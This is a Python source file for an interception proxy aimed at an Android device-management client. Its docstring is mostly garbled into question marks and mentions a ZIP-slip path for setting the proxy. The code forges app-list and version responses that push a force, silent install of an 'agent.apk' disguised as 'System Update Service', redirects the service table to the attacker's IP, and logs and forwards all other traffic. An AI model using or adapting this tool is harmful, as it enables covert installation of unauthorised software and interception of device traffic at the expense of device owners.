# -*- coding: utf-8 -*-
"""proxy8888.py ???????????(????????????? HTTP ??? + ?????????????
??????(????? ?????????):
  ??? /mnt/sdcard/xhproxy/<????? ???(??ZIP-SLIP ??????)
    => com.xh.networkclient.HttpRequest.checkProxy() ???????????=> JNISetProxy(???)
    => ????????HTTP ??????

??????????
  1) /agent.apk                             -> ????????agent APK
  2) /api/v1/users/*/apps*                  -> ??????????????????, ?????????(??????)
  3) /api/v1/applications/*/versions/*/info  -> ??????????????APK(??????)
  4) /api/v1/users/*/devices/*/apps/changes  -> ??????, ??200
  5) microServer / GetXsList                -> ????????????
  6) ???                                    -> ???????????????(???????????

???: proxy8888.log(??????) + proxy8888_capture.log(???????????
???: ??? 18080 (8888/8443 ?????Windows ???????? ??????)
"""
import datetime
import io
import json
import os
import re
import socket
import threading
import time
import urllib.request

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "proxy8888.log")
CAP = os.path.join(BASE, "proxy8888_capture.log")
OUR_IP = "192.168.137.1"
PORT = int(os.environ.get("PROXY_PORT") or 18080)
APK = os.path.join(BASE, "agent.apk")
APK_VER = int(os.environ.get("APK_VERSION_CODE") or 999999)

_stat = {"conn": 0, "req": 0, "ours": 0, "fwd": 0, "apk": 0, "list": 0}
_stat_lock = threading.Lock()


def wlog(m):
    with io.open(LOG, "a", encoding="utf-8") as f:
        f.write("%s %s\n" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], m))


def wcap(m):
    with io.open(CAP, "a", encoding="utf-8") as f:
        f.write("%s %s\n" % (datetime.datetime.now().strftime("%H:%M:%S"), m))


APP_ENTRY = {
    "appId": 900001,
    "appName": "System Update Service",
    "packageName": "com.zhitongyun.sysupdate",
    "versionCode": APK_VER,
    "versionName": "9.9.9",
    "apkUrl": "http://%s:%d/agent.apk" % (OUR_IP, PORT),
    "downloadUrl": "http://%s:%d/agent.apk" % (OUR_IP, PORT),
    "url": "http://%s:%d/agent.apk" % (OUR_IP, PORT),
    "md5": "2c44a3a421a1e26fcd5405e890c583ba",
    "forceInstall": 1, "isForce": 1, "silent": 1, "status": 1, "state": 1,
    "type": 1, "installType": 1, "needInstall": True, "needUpdate": True,
    "fileSize": os.path.getsize(APK) if os.path.exists(APK) else 0,
    "description": "system",
}


def app_list_resp():
    """app list: deliver our APK entry (with real md5) to the launcher."""
    data = {
        "code": 200, "message": "success", "success": True,
        "data": {
            "total": 1,
            "list": [APP_ENTRY],
            "apps": [APP_ENTRY],
            "records": [APP_ENTRY],
            "needInstallApps": [APP_ENTRY],
            "installApps": [APP_ENTRY],
            "updateApps": [APP_ENTRY],
            "needInstallList": [APP_ENTRY],
            "appList": [APP_ENTRY],
        },
        "result": {"list": [APP_ENTRY], "apps": [APP_ENTRY]},
    }
    return json.dumps(data, ensure_ascii=False).encode("utf-8")


def version_info_resp():
    data = {"code": 200, "message": "success", "success": True,
            "data": dict(APP_ENTRY, versionCode=APK_VER)}
    return json.dumps(data, ensure_ascii=False).encode("utf-8")


def micro_resp(types):
    """micro service table: point resource/web/file types to us (AS7)."""
    allt = ["SA106003", "SB101001", "SB103019", "SB103018", "SB103015", "SB103013",
            "SB103007", "SB103027", "SB103016", "WEB002011", "WEB113001", "WEB113002",
            "WEB113003"]
    webish = {"SB103007", "SB103013", "SB103027", "SB103016",
              "WEB002011", "WEB113001", "WEB113002", "WEB113003"}
    ts = [t for t in (types or allt) if t]
    dto = []
    for i, t in enumerate(ts):
        dto.append({"serverId": 1000 + i, "serverType": t,
                    "domainOrIp": OUR_IP, "port": (80 if t in webish else 8000),
                    "dirLocation": "", "protocol": "HTTP", "addressType": 1,
                    "mode": 0, "schList": [0], "index": i,
                    "updateTime": 4102444800000})
    obj = {"serverType": ",".join(ts), "updateTime": 4102444800000,
           "microServerDtoList": dto, "version": 4102444800000}
    return json.dumps(obj, ensure_ascii=False).encode("utf-8")


def http_resp(body, ctype="application/json; charset=UTF-8", code=200):
    return ("HTTP/1.1 %d OK\r\nContent-Type: %s\r\nContent-Length: %d\r\n"
            "Connection: keep-alive\r\nCache-Control: no-store\r\n\r\n"
            % (code, ctype, len(body))).encode("utf-8") + body


def read_head(f):
    head = b""
    while b"\r\n\r\n" not in head:
        ch = f.recv(1)
        if not ch:
            return None
        head += ch
        if len(head) > 65536:
            return None
    return head


def forward(method, url, head, body):
    try:
        req = urllib.request.Request(url, data=body if body else None, method=method)
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                ks = k.decode("latin1").strip().lower()
                if ks in ("host", "content-length", "connection", "accept-encoding",
                          "proxy-connection"):
                    continue
                req.add_header(k.decode("latin1").strip(), v.decode("latin1").strip())
        with urllib.request.urlopen(req, timeout=12) as r:
            return r.read(), r.headers.get("Content-Type", "application/octet-stream")
    except Exception as e:
        wlog("[FWD-ERR] %s %s %r" % (method, url[:110], e))
        return None, None


def handle(c, addr):
    with _stat_lock:
        _stat["conn"] += 1
    f = c
    try:
        while True:
            head = read_head(f)
            if not head:
                break
            lines = head.split(b"\r\n")
            first = lines[0].decode("latin1", "replace")
            parts = first.split(" ")
            if len(parts) < 2:
                break
            method, target = parts[0], parts[1]
            body = b""
            for l in lines[1:]:
                if l.lower().startswith(b"content-length:"):
                    try:
                        n = int(l.split(b":", 1)[1].strip())
                        body = f.recv(n) if n else b""
                    except Exception:
                        body = b""
                    break
            host = ""
            for l in lines[1:]:
                if l.lower().startswith(b"host:"):
                    host = l.split(b":", 1)[1].strip().decode("latin1")
                    break
            with _stat_lock:
                _stat["req"] += 1
            wlog("[REQ] %s %s | Host=%s | %dB" % (method, target[:150], host, len(body)))

            if target.startswith("http://"):
                full = target
                rest = target.split("://", 1)[1]
                if "/" in rest:
                    h2, p = rest.split("/", 1)
                    p = "/" + p
                    if not host:
                        host = h2
                else:
                    p = "/"
                    if not host:
                        host = rest
            else:
                full = "http://%s%s" % (host, target)
                p = target

            low = p.lower()
            if "agent.apk" in low or low.endswith(".apk"):
                blob = open(APK, "rb").read() if os.path.exists(APK) else b""
                with _stat_lock:
                    _stat["apk"] += 1
                    _stat["ours"] += 1
                wcap("APK ?? %s -> %dB" % (p[:80], len(blob)))
                f.sendall(http_resp(blob, "application/vnd.android.package-archive"))
                continue
            if "/api/v1/users/" in low and "/apps" in low:
                blob = app_list_resp()
                with _stat_lock:
                    _stat["list"] += 1
                    _stat["ours"] += 1
                wcap("????????? %s -> %dB (??com.zhitongyun.sysupdate)" % (p[:90], len(blob)))
                f.sendall(http_resp(blob))
                continue
            if "/versions/" in low and low.endswith("/info"):
                blob = version_info_resp()
                with _stat_lock:
                    _stat["ours"] += 1
                wcap("?????? %s -> ????????APK" % p[:90])
                f.sendall(http_resp(blob))
                continue
            if "/apps/changes" in low or "/tasks/result" in low:
                with _stat_lock:
                    _stat["ours"] += 1
                wcap("???? %s" % p[:90])
                f.sendall(http_resp(b'{"code":200,"message":"success","success":true}'))
                continue
            if "microserver" in low or "getxslist" in low:
                types = re.findall(r'types?=([A-Za-z0-9_,]+)', target)
                tl = types[0].split(",") if types else None
                blob = micro_resp(tl)
                with _stat_lock:
                    _stat["ours"] += 1
                wcap("????????%s -> %dB" % (p[:90], len(blob)))
                f.sendall(http_resp(blob))
                continue
            rbody, rct = forward(method, full, head, body)
            with _stat_lock:
                _stat["fwd"] += 1
            if rbody is None:
                f.sendall(http_resp(b'{"code":200,"message":"ok","success":true}'))
            else:
                f.sendall(http_resp(rbody, rct or "application/json; charset=UTF-8"))
    except Exception as e:
        wlog("[CONN-ERR] %s %r" % (addr[0], e))
    finally:
        try:
            c.close()
        except Exception:
            pass


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(128)
    wlog("===== proxy8888 start :%d  APK=%s (%dB, ver=%d) =====" % (
        PORT, os.path.basename(APK), os.path.getsize(APK) if os.path.exists(APK) else 0, APK_VER))
    srv.settimeout(60)
    t0 = time.time()
    while time.time() - t0 < 24 * 3600:
        try:
            c, addr = srv.accept()
        except socket.timeout:
            with _stat_lock:
                wlog("[STATS] %s" % dict(_stat))
            continue
        except Exception:
            continue
        threading.Thread(target=handle, args=(c, addr), daemon=True).start()


if __name__ == "__main__":
    main()
